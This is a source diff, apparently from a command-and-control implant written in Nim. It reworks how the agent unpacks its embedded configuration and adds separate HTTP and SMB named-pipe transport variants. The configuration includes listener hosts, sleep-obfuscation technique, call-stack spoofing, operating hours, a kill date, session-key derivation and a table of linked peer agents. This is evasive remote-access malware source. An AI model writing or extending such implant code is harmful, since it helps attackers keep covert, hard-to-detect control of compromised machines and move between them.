@@ -1,3 +1,4 @@
+import tables
 import ../utils/io
 import ../../common/[types, utils, crypto, profile, serialize]
 
@@ -24,34 +25,66 @@ proc deserializeConfiguration(config: string): AgentCtx =
     unpacker = Unpacker.init(Bytes.toString(decData))
 
     var agentKeyPair = generateKeyPair() 
-    var ctx = AgentCtx(
-        agentId: generateUUID(),
-        listenerId: Uuid.toString(unpacker.getUint32()),
-        hosts: unpacker.getDataWithLengthPrefix(),
-        sleepSettings: SleepSettings(
-            sleepDelay: unpacker.getUint32(),
-            jitter: unpacker.getUint32(),
-            sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
-            spoofStack: cast[bool](unpacker.getUint8()),
-            workingHours: WorkingHours(
-                enabled: cast[bool](unpacker.getUint8()),
-                startHour: cast[int32](unpacker.getUint32()),
-                startMinute: cast[int32](unpacker.getUint32()),
-                endHour: cast[int32](unpacker.getUint32()),
-                endMinute: cast[int32](unpacker.getUint32())
-            )
-        ),
-        killDate: cast[int64](unpacker.getUint64()),
-        sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
-        agentPublicKey: agentKeyPair.publicKey,
-        profile: parseString(unpacker.getDataWithLengthPrefix()),
-        registered: false
-    ) 
+
+    when defined(TRANSPORT_HTTP): 
+        result = AgentCtx(
+            agentId: generateUUID(),
+            transport: TransportSettings(
+                listenerId: Uuid.toString(unpacker.getUint32()),
+                hosts: unpacker.getDataWithLengthPrefix()
+            ),
+            sleepSettings: SleepSettings(
+                sleepDelay: unpacker.getUint32(),
+                jitter: unpacker.getUint32(),
+                sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
+                spoofStack: cast[bool](unpacker.getUint8()),
+                workingHours: WorkingHours(
+                    enabled: cast[bool](unpacker.getUint8()),
+                    startHour: cast[int32](unpacker.getUint32()),
+                    startMinute: cast[int32](unpacker.getUint32()),
+                    endHour: cast[int32](unpacker.getUint32()),
+                    endMinute: cast[int32](unpacker.getUint32())
+                )
+            ),
+            killDate: cast[int64](unpacker.getUint64()),
+            sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
+            agentPublicKey: agentKeyPair.publicKey,
+            profile: parseString(unpacker.getDataWithLengthPrefix()),
+            registered: false,
+            links: initTable[string, uint32]()
+        ) 
+
+    when defined(TRANSPORT_SMB): 
+        result = AgentCtx(
+            agentId: generateUUID(),
+            transport: TransportSettings(
+                listenerId: Uuid.toString(unpacker.getUint32()),
+                pipe: unpacker.getDataWithLengthPrefix(),
+                hPipe: 0    # Initialize to 0
+            ),
+            sleepSettings: SleepSettings(
+                sleepDelay: unpacker.getUint32(),
+                jitter: unpacker.getUint32(),
+                sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
+                spoofStack: cast[bool](unpacker.getUint8()),
+                workingHours: WorkingHours(
+                    enabled: cast[bool](unpacker.getUint8()),
+                    startHour: cast[int32](unpacker.getUint32()),
+                    startMinute: cast[int32](unpacker.getUint32()),
+                    endHour: cast[int32](unpacker.getUint32()),
+                    endMinute: cast[int32](unpacker.getUint32())
+                )
+            ),
+            killDate: cast[int64](unpacker.getUint64()),
+            sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
+            agentPublicKey: agentKeyPair.publicKey,
+            profile: parseString(unpacker.getDataWithLengthPrefix()),
+            registered: false,
+            links: initTable[string, uint32]()
+        ) 
 
     wipeKey(agentKeyPair.privateKey)
-    
     print "[+] Profile configuration deserialized."
-    return ctx
 
 proc init*(T: type AgentCtx): AgentCtx = 
 
